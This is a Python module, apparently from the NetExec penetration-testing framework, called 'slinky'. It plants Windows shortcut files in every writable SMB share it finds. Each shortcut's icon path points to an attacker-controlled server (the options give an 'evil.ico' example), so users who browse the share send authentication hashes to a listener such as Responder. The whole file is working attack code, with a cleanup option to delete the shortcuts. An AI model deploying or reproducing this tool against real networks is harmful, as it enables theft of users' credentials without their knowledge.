import pylnk3
import ntpath
from sys import exit
from nxc.paths import TMP_PATH

class NXCModule:
    """
    Original idea and PoC by Justin Angel (@4rch4ngel86)
    Module by @byt3bl33d3r
    Updated by @Marshall-Hallenbeck
    """

    name = "slinky"
    description = "Creates windows shortcuts with the icon attribute containing a URI to the specified  server (default SMB) in all shares with write permissions"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True

    def __init__(self):
        self.server = None
        self.remote_file_path = None
        self.local_lnk_path = None
        self.lnk_name = None
        self.ico_uri = None
        self.shares = None
        self.ignore_shares = ["C$", "ADMIN$", "NETLOGON", "SYSVOL"]
        self.cleanup = None

    def options(self, context, module_options):
        r"""
        SERVER        IP of the listening server (running Responder, etc)
        NAME          LNK file name written to the share(s)
        ICO_URI       Override full ICO path (e.g. http://192.168.1.2/evil.ico or \\\\192.168.1.2\\testing_path\\icon.ico)
        SHARES        Specific shares to write to (comma separated, e.g. SHARES=share1,share2,share3)
        IGNORE        Specific shares to ignore (comma separated, default: C$,ADMIN$,NETLOGON,SYSVOL)
        CLEANUP       Cleanup (choices: True or False)
        """
        self.cleanup = False

        if "CLEANUP" in module_options:
            self.cleanup = bool(module_options["CLEANUP"])
            context.log.debug("Cleanup set to True")

        if "NAME" not in module_options:
            context.log.fail("NAME option is required!")
            exit(1)
            
        if "SHARES" in module_options:
            self.shares = module_options["SHARES"].split(",")
            context.log.debug(f"Shares to write to: {self.shares}")
            
        if "IGNORE" in module_options:
            self.ignore_shares = module_options["IGNORE"].split(",")
            context.log.debug(f"Ignoring shares: {self.ignore_shares}")

        if not self.cleanup and "SERVER" not in module_options:
            context.log.fail("SERVER option is required!")
            exit(1)
            
        if "ICO_URI" in module_options:
            self.ico_uri = module_options["ICO_URI"]
            context.log.debug("Overriding")
            
            
        self.lnk_name = module_options["NAME"]
        self.local_lnk_path = f"{TMP_PATH}/{self.lnk_name}.lnk"
        self.remote_file_path = ntpath.join("\\", f"{self.lnk_name}.lnk")

        if not self.cleanup:
            self.server = module_options["SERVER"]
            link = pylnk3.create(self.local_lnk_path)
            link.icon = self.ico_uri if self.ico_uri else f"\\\\{self.server}\\icons\\icon.ico"
            link.save()

    def on_login(self, context, connection):
        shares = connection.shares()
        if shares:
            slinky_logger = context.log.init_log_file()
            context.log.add_file_log(slinky_logger)
            
            for share in shares:
                if "WRITE" in share["access"] and share["name"] not in self.ignore_shares:
                    if self.shares is not None and share["name"] not in self.shares:
                        context.log.debug(f"Did not write to {share['name']} share as it was not specified in the SHARES option")
                        continue
                    
                    context.log.success(f"Found writable share: {share['name']}")
                    if not self.cleanup:
                        with open(self.local_lnk_path, "rb") as lnk:
                            try:
                                connection.conn.putFile(share["name"], self.remote_file_path, lnk.read)
                                context.log.success(f"Created LNK file on the {share['name']} share")
                            except Exception as e:
                                context.log.fail(f"Error writing LNK file to share {share['name']}: {e}")
                    else:
                        try:
                            connection.conn.deleteFile(share["name"], self.remote_file_path)
                            context.log.success(f"Deleted LNK file on the {share['name']} share")
                        except Exception as e:
                            context.log.fail(f"Error deleting LNK file on share {share['name']}: {e}")
